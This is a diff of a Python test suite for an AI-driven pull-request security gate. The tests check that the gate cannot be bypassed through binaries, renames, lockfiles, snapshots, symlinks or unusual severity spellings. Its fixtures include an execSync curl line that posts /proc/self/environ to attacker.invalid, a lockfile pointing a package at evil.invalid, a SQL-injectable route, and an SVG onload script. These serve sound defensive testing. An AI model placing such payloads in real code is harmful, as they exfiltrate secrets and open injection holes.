@@ -3,12 +3,23 @@
 Round 2: no verdict shopping (cut replies with findings, content filters),
 time budget that fits the job, odd response bodies, private failure reasons.
 Round 3: quoted diff headers, cut replies that don't parse, lenient normaliza,
-partial reads of big diffs, public log without failure reasons."""
+partial reads of big diffs, public log without failure reasons.
+Round 4: binary route, pathspec excludes and lockfiles, severity/confidence
+spellings, dropped findings, duplicate keys, submodules, tests in CI.
+Round 5: assets skipped only when every name is an image/font and the block is
+really binary; symlinks, snapshots, non-asset binaries, English keys, big
+risk-only diffs, image-only PRs.
+Round 6: the gate's own source (U+FFFD only on added lines), assets decided by
+the new side, a finding cut before its severity, repeated keys, severity words.
+Round 7: capitalised keys (main's raw fallback had re.I), .ttf/.avif only with a
+NUL start, non-Latin and parenthesised severities, a loose summary object.
+Round 8: a grave severity outside the list, uppercase image extensions."""
 import http.client
 import io
 import json
 import os
 import re
+import shlex
 import shutil
 import subprocess
 import sys
@@ -40,6 +51,91 @@ def diff_real(nomes, quote_path):
         arvore = git("write-tree").decode().strip()
         vazia = git("hash-object", "-t", "tree", "-w", "--stdin", entrada=b"").decode().strip()
         return git("-c", f"core.quotePath={quote_path}", "diff", "--no-color", vazia, arvore).decode("utf-8")
+
+
+CI = WORKFLOW.parent / "ci.yml"
+ROTA = "src/app/api/pay/route.ts"
+VULN = (b"export async function GET(req){ const id=new URL(req.url).searchParams.get('id');"
+        b" return db.query('select * from pay where id='+id) }\n")
+BASE = {ROTA: b"export async function GET(){ return new Response('ok') }\n", "README.md": b"x\n"}
+PROXY = (b"import { NextResponse } from 'next/server'\nexport function proxy(req){ if(!req.cookies.get('sb'))"
+         b" return NextResponse.redirect(new URL('/login', req.url)); return NextResponse.next() }\n")
+PNG = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89"
+JPG = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01"
+PAYLOAD = b"require('child_process').execSync('curl -d @/proc/self/environ https://attacker.invalid')\n"
+
+
+def png_real(larg, alt, semente, texto=b""):
+    """PNG de verdade (IHDR, tEXt opcional, IDAT com ruído, IEND): tem 0x0a no meio como imagem real."""
+    import random
+    import struct
+    import zlib
+    r = random.Random(semente)
+    cru = b"".join(b"\x00" + bytes(r.randrange(256) for _ in range(larg * 3)) for _ in range(alt))
+
+    def pedaco(tipo, dado):
+        return struct.pack(">I", len(dado)) + tipo + dado + struct.pack(">I", zlib.crc32(tipo + dado))
+    return (b"\x89PNG\r\n\x1a\n" + pedaco(b"IHDR", struct.pack(">IIBBBBB", larg, alt, 8, 2, 0, 0, 0))
+            + (pedaco(b"tEXt", texto) if texto else b"") + pedaco(b"IDAT", zlib.compress(cru)) + pedaco(b"IEND", b""))
+
+
+def git_em(pasta, *a, entrada=None):
+    return subprocess.run(["git", "-c", "core.protectNTFS=false", "-c", "core.autocrlf=false",
+                           "-c", "commit.gpgsign=false", "-c", "user.email=t@t", "-c", "user.name=t", *a],
+                          cwd=pasta, input=entrada, capture_output=True, check=True).stdout
+
+
+def comandos_do_workflow():
+    """{"pr.diff": cmd, "pr.names": cmd}: os comandos do próprio porteiro.yml."""
+    yml = WORKFLOW.read_text(encoding="utf-8")
+    return {dest: cmd for cmd, dest in re.findall(r'^\s*(git [^\n>]*?)\s*>\s*"\$RUNNER_TEMP/(pr\.\w+)"', yml, re.M)}
+
+
+def pr_real(pasta, base, head, sem_text=False, sem_renames=False):
+    """Commit base, commit head (None apaga; ("link", alvo) e ("sub", sha) viram
+    link simbólico 120000 e submódulo 160000 pelo índice), e roda os comandos do
+    workflow como o job roda. Devolve (caminho do diff, caminho dos nomes)."""
+    repo = Path(pasta, "repo")
+    repo.mkdir()
+    git_em(repo, "init", "-q")
+    shas = []
+    for arvore in (base, head):
+        especiais = {p: c for p, c in arvore.items() if isinstance(c, tuple)}
+        for p, c in arvore.items():
+            if p in especiais:
+                continue
+            f = repo / p
+            f.parent.mkdir(parents=True, exist_ok=True)
+            f.unlink() if c is None else f.write_bytes(c)
+        git_em(repo, "add", "-A")
+        for p, (tipo, alvo) in especiais.items():
+            sha = alvo if tipo == "sub" else git_em(repo, "hash-object", "-w", "--stdin", entrada=alvo.encode()).decode().strip()
+            git_em(repo, "update-index", "--add", "--cacheinfo", f"{'160000' if tipo == 'sub' else '120000'},{sha},{p}")
+        git_em(repo, "commit", "-qm", "x", "--allow-empty")
+        shas.append(git_em(repo, "rev-parse", "HEAD").decode().strip())
+    saidas = []
+    for dest in ("pr.diff", "pr.names"):
+        cmd = comandos_do_workflow()[dest].replace("$BASE...$HEAD", "{}...{}".format(*shas))
+        if sem_text:  # a local run, or the old workflow: no --text
+            cmd = cmd.replace(" --text", "")
+        if sem_renames:  # a local run: git's default rename detection
+            cmd = cmd.replace(" --no-renames", "")
+        Path(pasta, dest).write_bytes(subprocess.run(shlex.split(cmd), cwd=repo, capture_output=True, check=True).stdout)
+        saidas.append(str(Path(pasta, dest)))
+    return tuple(saidas)
+
+
+def diff_submodulo(antes, depois):
+    """Diff de verdade de um submódulo (modo 160000); antes=None = submódulo novo."""
+    with tempfile.TemporaryDirectory() as d:
+        git_em(d, "init", "-q")
+        arvores = []
+        for alvo in (antes, depois):
+            git_em(d, "read-tree", "--empty")
+            if alvo:
+                git_em(d, "update-index", "--add", "--cacheinfo", f"160000,{alvo},vendor/sub")
+            arvores.append(git_em(d, "write-tree").decode().strip())
+        return git_em(d, "-c", "core.quotePath=false", "diff", "--no-color", "--text", *arvores).decode()
 
 
 class ErroDaZaiTest(unittest.TestCase):
@@ -111,7 +207,8 @@ class CadeiaDeReservaTest(unittest.TestCase):
     lista = uma por chamada (a última se repete)."""
 
     def roda(self, por_modelo, env=TODAS, modo="barra", relogio=None,
-             diff="diff --git a/a b/a\n+x", canal="no Telegram"):
+             diff="diff --git a/a b/a\n+x", canal="no Telegram", reais=None):
+        """reais=(diff, nomes): arquivos de verdade no disco, sem mock do open."""
         pedidos, self.timeouts = [], []
 
         def responde(req, timeout=None):
@@ -141,7 +238,8 @@ class CadeiaDeReservaTest(unittest.TestCase):
         saida = io.StringIO()
         with ExitStack() as pilha:
             pilha.enter_context(patch.dict(os.environ, dict(env, PORTEIRO_MODO=modo), clear=True))
-            pilha.enter_context(patch("builtins.open", mock_open(read_data=diff)))
+            if not reais:
+                pilha.enter_context(patch("builtins.open", mock_open(read_data=diff)))
             escreve = pilha.enter_context(patch.object(porteiro, "escreve"))
             detalhe = pilha.enter_context(patch.object(porteiro, "manda_detalhe", return_value=canal))
             dorme = pilha.enter_context(patch.object(porteiro.time, "sleep", side_effect=dorme_relogio))
@@ -149,7 +247,8 @@ class CadeiaDeReservaTest(unittest.TestCase):
                 pilha.enter_context(patch.object(porteiro.time, "monotonic", side_effect=lambda: relogio[0]))
             pilha.enter_context(patch("urllib.request.urlopen", side_effect=responde))
             pilha.enter_context(redirect_stdout(saida))
-            codigo = porteiro.main(["--diff", "d", "--placar", "p"])
+            codigo = porteiro.main(["--diff", reais[0], "--nomes", reais[1], "--placar", "p"] if reais
+                                   else ["--diff", "d", "--placar", "p"])
         placar = escreve.call_args.args[1]
         self.assertNotIn(CHAVE, saida.getvalue() + placar)
         self.dormidas = dorme.call_count
@@ -385,12 +484,17 @@ class CadeiaDeReservaTest(unittest.TestCase):
         texto = ('{"achados":[{"titulo":"IDOR","arquivo":"a","severidade":"alta",'
                  '"confianca":1' + "0" * 400 + ',"linha":1e400}]}')
         a = porteiro.normaliza(porteiro.extrai_json(texto))["achados"][0]
-        self.assertEqual((a["confianca"], a["linha"]), (0.5, 0))
+        # Round 4: an alta finding whose confidence overflows is 1.0, not 0.5.
+        self.assertEqual((a["confianca"], a["linha"]), (1.0, 0))
+        # NaN falls back to the default: 0.5 for a light finding; Round 5: a title
+        # with no severity is alta, so its default is 1.0.
         self.assertEqual(porteiro.normaliza(porteiro.extrai_json(
-            '{"achados":[{"titulo":"t","confianca":NaN}]}'))["achados"][0]["confianca"], 0.5)
+            '{"achados":[{"titulo":"t","severidade":"baixa","confianca":NaN}]}'))["achados"][0]["confianca"], 0.5)
+        self.assertEqual(porteiro.normaliza(porteiro.extrai_json(
+            '{"achados":[{"titulo":"t","confianca":NaN}]}'))["achados"][0]["confianca"], 1.0)
         codigo, placar, modelos, _ = self.roda({"glm-5": texto})
-        self.assertEqual((codigo, modelos), (0, ["glm-5"]))  # conf 0.5 => warning, no crash
-        self.assertIn("1 achado · 0 bloqueantes", placar)
+        self.assertEqual((codigo, modelos), (1, ["glm-5"]))  # blocks, no crash
+        self.assertIn("1 achado · 1 bloqueante", placar)
 
     def test_K_json_patologico_vira_malformado(self):
         for texto in ("1" * 5000, "[" * 100000, '{"achados":' + "[" * 100000):
@@ -408,7 +512,9 @@ class CadeiaDeReservaTest(unittest.TestCase):
         for arq in ("b/src/app/x.ts", "a/src/app/x.ts", "src\\app\\x.ts", "./src/app/x.ts"):
             bloq, _, fora = porteiro.classifica([dict(base, arquivo=arq)], ["src/app/x.ts"])
             self.assertEqual((len(bloq), fora), (1, 0), arq)
-        resposta = json.dumps({"achados": [dict(ALTA, arquivo="b/a"), dict(ALTA, arquivo="outro.ts", titulo="base")]})
+        # Round 4: only a non-blocking finding on an untouched file is dropped.
+        resposta = json.dumps({"achados": [dict(ALTA, arquivo="b/a"),
+                                           dict(ALTA, arquivo="outro.ts", titulo="base", severidade="baixa")]})
         codigo, placar, _, _ = self.roda({"glm-5": resposta})
         self.assertEqual(codigo, 1)
         self.assertIn("1 achado · 1 bloqueante", placar)
@@ -453,6 +559,611 @@ class CadeiaDeReservaTest(unittest.TestCase):
         self.roda({"glm-5": Z1113, "kimi-k3": VAZIO_JSON}, canal="não entregue (HTTP 502)")
         self.assertIn("z.ai glm-5: código 1113", self.log)
         self.assertNotIn("saldo", self.log)
+
+    # ---- Round 4: pre-existing bypasses (each failed on main after #408) ----
+    def pr(self, head, por_modelo, base=BASE, sem_text=False, sem_renames=False, **kw):
+        with tempfile.TemporaryDirectory() as d:
+            return self.roda(por_modelo, reais=pr_real(d, base, head, sem_text, sem_renames), **kw)
+
+    def viu(self, pedidos):
+        return "".join(c["messages"][1]["content"] for _, c in pedidos)
+
+    @unittest.skipUnless(shutil.which("git"), "git not installed")
+    def test_P1_binario_nao_esconde_codigo(self):
+        # The workflow's own diff command shows the code behind `* -diff`...
+        # Round 5: ...and a NUL byte in a code file is "binário não lido" (3),
+        # stricter than handing the model a route it may misread.
+        for nome, head in (("NUL", {ROTA: b"// \x00\n" + VULN}),
+                           ("-diff", {".gitattributes": b"* -diff\n", ROTA: VULN})):
+            with self.subTest(nome):
+                codigo, placar, modelos, pedidos = self.pr(head, {"glm-5": VAZIO_JSON})
+                if nome == "NUL":
+                    self.assertEqual((codigo, modelos), (3, []))
+                    self.assertIn("arquivo binário não lido", placar)
+                else:
+                    self.assertIn("select * from pay", self.viu(pedidos))
+                    self.assertEqual((codigo, modelos), (0, ["glm-5"]))
+                # Without --text git prints "Binary files ... differ": never 0.
+                for modo in ("avisa", "barra"):
+                    codigo, placar, modelos, _ = self.pr(head, {"glm-5": VAZIO_JSON}, sem_text=True, modo=modo)
+                    self.assertEqual((codigo, modelos), (3, []))
+                    self.assertIn("NÃO ANALISADO", placar)
+                    self.assertIn("arquivo binário não lido", placar)
+        codigo, placar, _, _ = self.roda({"glm-5": VAZIO_JSON}, diff=f"diff --git a/{ROTA} b/{ROTA}\nGIT binary patch\nliteral 3\n")
+        self.assertEqual(codigo, 3)
+        # A binary image is not code: skipped, the code next to it is analysed.
+        codigo, placar, modelos, pedidos = self.pr({"public/logo.png": b"\x89PNG\x00\x01", ROTA: VULN},
+                                                   {"glm-5": VAZIO_JSON}, sem_text=True)
+        self.assertEqual((codigo, modelos), (0, ["glm-5"]))
+        self.assertNotIn("logo.png", self.viu(pedidos))
+        self.assertIn("1 arquivo(s) de imagem/fonte fora da análise", placar)
+
+    @unittest.skipUnless(shutil.which("git"), "git not installed")
+    def test_P2_sem_pathspec_lockfile_e_nada_lido_nunca_verde(self):
+        # A route inside a folder named like an image is still code.
+        for seg in ("x.png", "logo.svg", "a.snap", "f.woff2"):
+            with self.subTest(seg):
+                _, _, modelos, pedidos = self.pr({f"src/app/api/{seg}/route.ts": VULN}, {"glm-5": VAZIO_JSON})
+                self.assertEqual(modelos, ["glm-5"])
+                self.assertIn(f"src/app/api/{seg}/route.ts", self.viu(pedidos))
+        # SVG carries script: it is analysed.
+        _, _, _, pedidos = self.pr({"public/a.svg": b"<svg onload=alert(1)></svg>\n"}, {"glm-5": VAZIO_JSON})
+        self.assertIn("onload=alert", self.viu(pedidos))
+        # Lockfile-only PR pointing a package at another host: the model reads it.
+        lock = '{"packages":{"node_modules/x":{"resolved":"%s","integrity":"sha512-%s"}}}\n'
+        base = dict(BASE, **{"package-lock.json": (lock % ("https://registry.npmjs.org/x/-/x-1.0.0.tgz", "A")).encode()})
+        _, _, modelos, pedidos = self.pr({"package-lock.json": (lock % ("https://evil.invalid/x.tgz", "B")).encode()},
+                                         {"glm-5": VAZIO_JSON}, base=base)
+        self.assertEqual(modelos, ["glm-5"])
+        self.assertIn("evil.invalid", self.viu(pedidos))
+        for lockfile in ("package-lock.json", "apps/web/package-lock.json", "yarn.lock", "pnpm-lock.yaml"):
+            self.assertTrue(porteiro.eh_de_risco(lockfile), lockfile)  # kept when the diff is big
+        # Round 5: a real binary image only: no AI call, 0 with a note (Q9 has more).
+        for modo in ("avisa", "barra"):
+            codigo, placar, modelos, _ = self.pr({"public/logo.png": b"\x89PNG\x00\x01"}, {"glm-5": VAZIO_JSON}, modo=modo)
+            self.assertEqual((codigo, modelos), (0, []))
+            self.assertIn("só com arquivos de imagem/fonte (1)", placar)
+        # A lone "\r" in the content cannot forge a header that hides the rest.
+        _, _, _, pedidos = self.pr({ROTA: b"// \rdiff --git a/x.png b/x.png\n" + VULN}, {"glm-5": VAZIO_JSON})
+        self.assertIn("select * from pay", self.viu(pedidos))
+
+    def test_P2b_arquivo_listado_pelo_git_fora_do_diff_da_3(self):
+        with tempfile.TemporaryDirectory() as d:
+            dp, np_ = Path(d, "pr.diff"), Path(d, "pr.names")
+            dp.write_text(f"diff --git a/{ROTA} b/{ROTA}\n+x\n", encoding="utf-8")
+            np_.write_bytes(f"{ROTA}\0src/sumiu.ts\0".encode())
+            codigo, placar, modelos, _ = self.roda({"glm-5": VAZIO_JSON}, reais=(str(dp), str(np_)))
+            self.assertEqual((codigo, modelos), (3, ["glm-5"]))
+            self.assertIn("PARCIAL — 1 arquivo(s) não lidos (fora do diff)", placar)
+            dp.write_text("", encoding="utf-8")  # empty diff, files changed
+            codigo, placar, modelos, _ = self.roda({"glm-5": VAZIO_JSON}, reais=(str(dp), str(np_)))
+            self.assertEqual((codigo, modelos), (3, []))
+            self.assertNotIn("✅", placar)
+
+    def test_P3_severidade_e_confianca_em_qualquer_grafia_barram(self):
+        f = {"titulo": "SQLi", "arquivo": "a", "linha": 1, "severidade": "critica", "confianca": 0.95}
+        casos = {
+            "confianca ausente": {k: v for k, v in f.items() if k != "confianca"},
+            "confianca 95%": dict(f, confianca="95%"),
+            "confianca alta": dict(f, confianca="alta"),
+            "confianca null": dict(f, confianca=None),
+            "confianca 10**400": dict(f, confianca=10 ** 400),
+            "crítica": dict(f, severidade="crítica"),
+            "CRITICAL": dict(f, severidade="CRITICAL"),
+            "high": dict(f, severidade="high"),
+            "Alta ": dict(f, severidade="Alta "),
+            "desconhecida": dict(f, severidade="severe"),
+        }
+        for nome, a in casos.items():
+            with self.subTest(nome):
+                codigo, placar, _, _ = self.roda({"glm-5": json.dumps({"achados": [a]})})
+                self.assertEqual(codigo, 1)
+                self.assertIn("1 bloqueante", placar)
+        codigo, _, _, _ = self.roda({"glm-5": '{"achados":[{"titulo":"t","arquivo":"a","severidade":"alta","confianca":NaN}]}'})
+        self.assertEqual(codigo, 1)
+        # Round 5: English keys are read, so this one blocks at once...
+        ingles = json.dumps({"achados": [{"severity": "critical", "file": "a", "title": "SQLi"},
+                                         {"titulo": "leve", "arquivo": "a", "severidade": "baixa"}]})
+        codigo, placar, modelos, _ = self.roda({"glm-5": ingles, "kimi-k3": VAZIO_JSON})
+        self.assertEqual((codigo, modelos), (1, ["glm-5"]))
+        # ...and keys in no known spelling next to a light one are out of format,
+        # not "one warning": every AI tries, then 3.
+        estranho = json.dumps({"achados": [{"level": "critical", "path": "a", "name": "SQLi"},
+                                           {"titulo": "leve", "arquivo": "a", "severidade": "baixa"}]})
+        codigo, placar, modelos, _ = self.roda({m: estranho for m in ("glm-5", "kimi-k3", "kimi-k2.6", "gpt-6-astra", "gpt-5.5")})
+        self.assertEqual(codigo, 3)
+        self.assertIn("NÃO ANALISADO", placar)
+        self.assertIsNotNone(porteiro.normaliza({"achados": [{"severity": "x"}, ALTA]}))  # blocking wins
+        # Cut reply whose raw text says "crítica" / "critical": indício, never the next AI.
+        for sev in ("crítica", "critical", "HIGH"):
+            with self.subTest(sev):
+                corte = '{"achados":[{"severidade": "%s","arquivo":"a","titulo":"SQL inj' % sev
+                codigo, placar, modelos, _ = self.roda({"glm-5": [(corte, "length"), Z1302], "kimi-k3": VAZIO_JSON})
+                self.assertEqual((codigo, modelos), (3, ["glm-5"]))
+                self.assertIn("indício de achado grave", placar)
+
+    @unittest.skipUnless(shutil.which("git"), "git not installed")
+    def test_P4_achado_grave_nunca_some(self):
+        diff = f"diff --git a/{ROTA} b/{ROTA}\n+x\n"
+        for arq in (f"{ROTA}:42", f"{ROTA}:42:7", ROTA.upper(), f"/home/runner/work/r/r/{ROTA}", f".\\{ROTA}"):
+            with self.subTest(arq):
+                codigo, _, _, _ = self.roda({"glm-5": json.dumps({"achados": [dict(ALTA, arquivo=arq)]})}, diff=diff)
+                self.assertEqual(codigo, 1)
+                self.assertEqual(self.detalhe[-1].args[0][0]["arquivo"], arq)  # matched, not relabelled
+        # No touched file matches: it still blocks, labelled in the private detail.
+        codigo, placar, _, _ = self.roda({"glm-5": json.dumps({"achados": [dict(ALTA, arquivo="src/nada.ts")]})}, diff=diff)
+        self.assertEqual(codigo, 1)
+        self.assertIn("1 bloqueante", placar)
+        self.assertIn("(arquivo não identificado) src/nada.ts", self.privado)
+        self.assertNotIn("nada.ts", placar)
+        # Pre-rename name. Local run (git's rename detection): "rename from".
+        velho, novo = "src/app/api/velho/route.ts", "src/app/api/novo/route.ts"
+        corpo = b"".join(b"// linha %d\n" % i for i in range(30))
+        achado = json.dumps({"achados": [dict(ALTA, arquivo=velho)]})
+        codigo, _, _, pedidos = self.pr({velho: None, novo: corpo + VULN}, {"glm-5": achado}, base={velho: corpo},
+                                        sem_renames=True)
+        self.assertIn(f"rename from {velho}", self.viu(pedidos))
+        self.assertEqual((codigo, self.detalhe[-1].args[0][0]["arquivo"]), (1, velho))
+        # Round 5, the workflow (--no-renames): the model reads the deleted code.
+        codigo, _, _, pedidos = self.pr({velho: None, novo: corpo + VULN}, {"glm-5": achado}, base={velho: corpo})
+        self.assertIn("-// linha 0", self.viu(pedidos))
+        self.assertEqual((codigo, self.detalhe[-1].args[0][0]["arquivo"]), (1, velho))
+
+    def test_P5_achados_duplicado_nao_apaga_o_bloqueante(self):
+        dup = '{"achados":[' + json.dumps(ALTA) + '],"achados":[]}'
+        self.assertEqual(len(porteiro.extrai_json(dup)["achados"]), 1)
+        codigo, placar, _, _ = self.roda({"glm-5": dup})
+        self.assertEqual(codigo, 1)
+        self.assertIn("1 bloqueante", placar)
+        self.assertEqual(len(porteiro.extrai_json('{"achados":[],"achados":' + json.dumps([ALTA]) + "}")["achados"]), 1)
+
+    def test_P6_log_publico_sem_frase_de_saldo_ou_chave(self):
+        # Missing GLM/OpenAI keys, no Kimi quota, and the private alert failed.
+        self.roda({"kimi-k3": KIMI_QUOTA, "kimi-k2.6": KIMI_QUOTA},
+                  env={"KIMI_API_KEY": CHAVE}, canal="não entregue (HTTP 500)")
+        self.assertIn("z.ai glm-5: sem código", self.log)
+        self.assertIn("Kimi kimi-k3: código exceeded_current_quota_error", self.log)
+        for frase in ("chave", "saldo", "recarregar"):
+            self.assertNotIn(frase, self.log)
+
+    @unittest.skipUnless(shutil.which("git"), "git not installed")
+    def test_P7_submodulo_nao_analisado(self):
+        for antes, depois in ((None, "a" * 40), ("a" * 40, "b" * 40)):  # added, pointer moved
+            diff = diff_submodulo(antes, depois)
+            self.assertIn("Subproject commit", diff)
+            for modo in ("avisa", "barra"):
+                with self.subTest(antes=antes, modo=modo):
+                    codigo, placar, modelos, _ = self.roda({"glm-5": VAZIO_JSON}, diff=diff, modo=modo)
+                    self.assertEqual((codigo, modelos), (3, []))
+                    self.assertIn("NÃO ANALISADO", placar)
+                    self.assertIn("submódulo", placar)
+
+    def test_P8_testes_do_porteiro_rodam_no_check_obrigatorio(self):
+        # "Lint, typecheck, test, build" (job `checks`) is a required check.
+        yml = CI.read_text(encoding="utf-8")
+        checks = yml.split("\n  checks:\n", 1)[1].split("\n  rls:\n", 1)[0]
+        self.assertIn("python3 -m unittest scripts/test_porteiro.py", checks)
+        self.assertIn("python3 scripts/porteiro.py --demo", checks)
+
+    # ---- Round 5: asset skip only for real binary images/fonts (each failed on f625ccd) ----
+    @unittest.skipUnless(shutil.which("git"), "git not installed")
+    def test_Q1_rename_de_codigo_para_nome_de_asset_e_lido(self):
+        base = dict(BASE, **{"src/proxy.ts": PROXY})
+        for ext in ("png", "snap", "woff2", "ico"):
+            head = {"README.md": b"x\ny\n", "src/proxy.ts": None, f"src/proxy.{ext}": PROXY}
+            for local in (False, True):  # the workflow (--no-renames) / a local run with renames
+                with self.subTest(ext=ext, local=local):
+                    _, _, modelos, pedidos = self.pr(head, {"glm-5": VAZIO_JSON}, base=base, sem_renames=local)
+                    self.assertEqual(modelos, ["glm-5"])
+                    self.assertIn("src/proxy.ts", self.viu(pedidos))
+                    if not local:  # the deleted auth code itself
+                        self.assertIn("-export function proxy", self.viu(pedidos))
+        # Binary code renamed (with a change) to an image name, local run: the
+        # "rename from" name keeps it off the asset path. Without --text git
+        # says "Binary files": 3. With --text the hunk (no NUL in it) is read.
+        blob = b"// \x00\n" + b"".join(b"export const k%d = %d\n" % (i, i) for i in range(200))
+        for sem_text in (True, False):
+            with self.subTest(binario=True, sem_text=sem_text):
+                codigo, placar, modelos, pedidos = self.pr(
+                    {"README.md": b"x\ny\n", "src/a.ts": None, "src/a.png": blob + b"// x\n"}, {"glm-5": VAZIO_JSON},
+                    base=dict(BASE, **{"src/a.ts": blob}), sem_text=sem_text, sem_renames=True)
+                if sem_text:
+                    self.assertEqual((codigo, modelos), (3, []))
+                    self.assertIn("arquivo binário não lido", placar)
+                else:
+                    self.assertIn("rename from src/a.ts", self.viu(pedidos))
+                    self.assertIn("+// x", self.viu(pedidos))
+
+    @unittest.skipUnless(shutil.which("git"), "git not installed")
+    def test_Q2_link_simbolico_e_submodulo_com_nome_de_asset_dao_3(self):
+        for nome, entrada, rotulo in (("public/og.png", ("link", "../.env.local"), "link simbólico"),
+                                      ("src/app/api/x/route.ts", ("link", "../../../../public/p.png"), "link simbólico"),
+                                      ("vendor/lib.png", ("sub", "a" * 40), "submódulo")):
+            for modo in ("avisa", "barra"):
+                with self.subTest(nome=nome, modo=modo):
+                    codigo, placar, modelos, _ = self.pr({"README.md": b"x\ny\n", nome: entrada},
+                                                         {"glm-5": VAZIO_JSON}, modo=modo)
+                    self.assertEqual((codigo, modelos), (3, []))
+                    self.assertIn("NÃO ANALISADO", placar)
+                    self.assertIn(rotulo, placar)
+
+    @unittest.skipUnless(shutil.which("git"), "git not installed")
+    def test_Q3_imagem_ou_fonte_so_de_texto_vai_ao_modelo(self):
+        for nome in ("public/p.png", "public/f.woff2", "favicon.ico"):
+            for sem_text in (False, True):
+                with self.subTest(nome=nome, sem_text=sem_text):
+                    _, _, modelos, pedidos = self.pr({nome: VULN}, {"glm-5": VAZIO_JSON}, sem_text=sem_text)
+                    self.assertEqual(modelos, ["glm-5"])
+                    self.assertIn("select * from pay", self.viu(pedidos))
+
+    @unittest.skipUnless(shutil.which("git"), "git not installed")
+    def test_Q4_snapshot_e_codigo(self):
+        # vitest runs snapshot files through new Function: they are code.
+        self.assertNotIn(".snap", porteiro.ASSETS)
+        head = {"src/x.test.ts": b"import {expect,test} from 'vitest'\ntest('x',()=>expect(1).toMatchSnapshot())\n",
+                "src/__snapshots__/x.test.ts.snap":
+                    b"require('child_process').execSync('curl https://attacker.invalid')\nexports[`x 1`] = `1`;\n"}
+        _, _, modelos, pedidos = self.pr(head, {"glm-5": VAZIO_JSON})
+        self.assertEqual(modelos, ["glm-5"])
+        self.assertIn("execSync", self.viu(pedidos))
+        # A NUL inside a comment is still valid JS: a binary snapshot is 3, never skipped.
+        codigo, placar, modelos, _ = self.pr({"README.md": b"x\ny\n", "src/__snapshots__/y.test.ts.snap":
+                                              b"/*\x00*/ require('child_process').execSync('id')\n"}, {"glm-5": VAZIO_JSON})
+        self.assertEqual((codigo, modelos), (3, []))
+        self.assertIn("arquivo binário não lido", placar)
+
+    @unittest.skipUnless(shutil.which("git"), "git not installed")
+    def test_Q5_binario_que_nao_e_imagem_nem_fonte_da_3(self):
+        # With --text these arrive as mojibake: the model would answer [].
+        pdf = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n1 0 obj\n"  # no NUL: only bytes that are not UTF-8
+        # Round 6: fonts/images whose signature is printable (JS polyglot) are code too.
+        for nome, blob in (("src/lib/x.wasm", b"\x00asm\x01\x00\x00\x00\x01\x07\x01`\x02\x7f\x7f\x01\x7f"),
+                           ("build/addon.node", b"MZ\x90\x00\x03\x00\x00\x00"), ("docs/a.pdf", pdf),
+                           ("lib/a.jar", b"PK\x03\x04\x14\x00\x08\x00"), ("public/f.otf", b"OTTO\x00\x0b\x00\x80"),
+                           ("public/f.woff", b"wOFF\x00\x01\x00\x00")):
+            for modo in ("avisa", "barra"):
+                with self.subTest(nome=nome, modo=modo):
+                    codigo, placar, modelos, _ = self.pr({nome: blob, ROTA: VULN}, {"glm-5": VAZIO_JSON}, modo=modo)
+                    self.assertEqual((codigo, modelos), (3, []))
+                    self.assertIn("arquivo binário não lido", placar)
+        # Real image/font bytes take the asset path: skipped, the code next to them is read.
+        for nome, blob in (("public/f.ttf", b"\x00\x01\x00\x00\x00\x0c\x00\x80"), ("public/p.jpg", JPG),
+                           ("public/a.avif", b"\x00\x00\x00\x1cftypavif"), ("favicon.ico", b"\x00\x00\x01\x00\x01\x00"),
+                           ("public/logo.png", PNG)):
+            with self.subTest(nome=nome):
+                codigo, _, modelos, pedidos = self.pr({nome: blob, ROTA: VULN}, {"glm-5": VAZIO_JSON})
+                self.assertEqual((codigo, modelos), (0, ["glm-5"]))
+                self.assertNotIn(nome, self.viu(pedidos))
+                self.assertIn("select * from pay", self.viu(pedidos))
+
+    def test_Q6_severidade_em_outras_grafias(self):
+        casos = {"baixo": "baixa", "médio": "media", "medio": "media", "alto": "alta", "crítico": "critica",
+                 "critico": "critica", "Moderate": "media", "moderado": "media", "moderada": "media",
+                 "info": "baixa", "Informational": "baixa", "informativo": "baixa", "informativa": "baixa",
+                 "none": "baixa", "nenhuma": "baixa", "nenhum": "baixa", "grave": "alta"}
+        self.assertEqual({k: porteiro._sev(k) for k in casos}, casos)
+        codigo, placar, _, _ = self.roda({"glm-5": json.dumps({"achados": [dict(ALTA, severidade="moderado")]})})
+        self.assertEqual(codigo, 0)  # a warning, even in "barra"
+        self.assertIn("1 achado · 0 bloqueantes", placar)
+        codigo, _, _, _ = self.roda({"glm-5": json.dumps({"achados": [dict(ALTA, severidade="crítico")]})})
+        self.assertEqual(codigo, 1)
+
+    def test_Q7_chaves_em_ingles_e_titulo_sem_severidade(self):
+        so_glm = {"GLM_API_KEY": CHAVE}
+        casos = {
+            "inglês": {"title": "SQLi", "severity": "critical", "file": "a", "line": 7, "confidence": 0.9},
+            "misto": {"titulo": "SQLi", "arquivo": "a", "severity": "critical"},
+            "nivel": {"titulo": "SQLi", "arquivo": "a", "nivel": "critica"},
+            "gravidade": {"titulo": "SQLi", "arquivo": "a", "gravidade": "alta"},
+            "severidade null": dict(ALTA, severidade=None),
+            "severidade vazia": dict(ALTA, severidade=" "),
+            "sem severidade": {"titulo": "SQLi", "arquivo": "a"},
+            "baixa e critical": dict(ALTA, severidade="baixa", severity="critical"),
+        }
+        for nome, a in casos.items():
+            with self.subTest(nome):
+                codigo, placar, modelos, _ = self.roda({"glm-5": json.dumps({"achados": [a]})}, env=so_glm)
+                self.assertEqual((codigo, modelos), (1, ["glm-5"]))
+                self.assertIn("1 bloqueante", placar)
+        self.roda({"glm-5": json.dumps({"achados": [casos["inglês"]]})}, env=so_glm)
+        a = self.detalhe[-1].args[0][0]
+        self.assertEqual((a["titulo"], a["arquivo"], a["linha"], a["confianca"]), ("SQLi", "a", 7, 0.9))
+        # "confidence" is read too: a low-confidence alta is a warning.
+        codigo, placar, _, _ = self.roda({"glm-5": json.dumps({"achados": [
+            {"title": "t", "severity": "high", "file": "a", "confidence": 0.3}]})}, env=so_glm)
+        self.assertEqual(codigo, 0)
+        self.assertIn("1 achado · 0 bloqueantes", placar)
+        # Cut replies: English "severity", or cut right inside the severity value.
+        for corte in ('{"achados":[{"severity":"critical","file":"a","title":"SQL inj',
+                      '{"achados":[{"titulo":"SQLi","arquivo":"a","severidade":"'):
+            with self.subTest(corte=corte):
+                codigo, placar, modelos, _ = self.roda({"glm-5": [(corte, "length"), VAZIO_JSON], "kimi-k3": VAZIO_JSON})
+                self.assertEqual((codigo, modelos), (3, ["glm-5"]))
+                self.assertIn("indício de achado grave", placar)
+
